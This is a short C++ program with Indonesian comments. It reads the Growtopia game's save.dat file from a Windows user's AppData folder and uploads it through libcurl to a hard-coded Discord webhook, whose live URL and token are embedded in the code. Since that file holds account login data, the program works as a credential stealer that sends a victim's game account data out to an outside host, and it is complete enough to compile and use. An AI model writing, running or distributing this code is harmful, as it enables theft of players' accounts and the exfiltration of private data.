#include <iostream>
#include <fstream>
#include <string>
#include <curl/curl.h>

size_t write_data(void* ptr, size_t size, size_t nmemb, std::string* data) {
    data->append((char*)ptr, size * nmemb);
    return size * nmemb;
}

int main() {
    // Ganti dengan path folder dan nama file.dat Anda
    std::string file_path = "C:\\Users\\Lenovo\\AppData\\Local\\Growtopia\\save.dat";

    // Ganti dengan URL webhook Discord Anda
    std::string webhook_url = "https://discord.com/api/webhooks/1310123751849066526/B5Kv687C3vlhOFvU0BO0bwXx28xq66fOBNUKnXTqclhy8Txwbn0gPVmwLbj8B2cyBTF8";

    std::ifstream file(file_path, std::ios::binary);
    if (!file.is_open()) {
        std::cerr << "Error: Tidak dapat membuka file.dat." << std::endl;
        return 1;
    }

    // Membaca file ke dalam string (hanya untuk memastikan file dapat dibaca)
    std::string file_content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();

    // Inisialisasi cURL
    CURL* curl;
    CURLcode res;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (curl) {
        // Membuat file part untuk multipart/form-data
        struct curl_httppost* formpost = nullptr;
        struct curl_httppost* lastptr = nullptr;

        // Menambahkan file sebagai part dalam form-data
        curl_formadd(&formpost, &lastptr, CURLFORM_COPYNAME, "file", CURLFORM_FILE, file_path.c_str(), CURLFORM_END);

        // Mengatur URL webhook Discord
        curl_easy_setopt(curl, CURLOPT_URL, webhook_url.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);

        // Menangani respon dari server
        std::string response_body;
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_body);

        // Melakukan request POST
        res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            std::cerr << "Error: " << curl_easy_strerror(res) << std::endl;
        }
        else {
            std::cout << "File berhasil dikirim ke Discord melalui webhook." << std::endl;
            std::cout << "Response: " << response_body << std::endl;
        }

        // Bersihkan form dan curl
        curl_formfree(formpost);
        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();
    return 0;
}
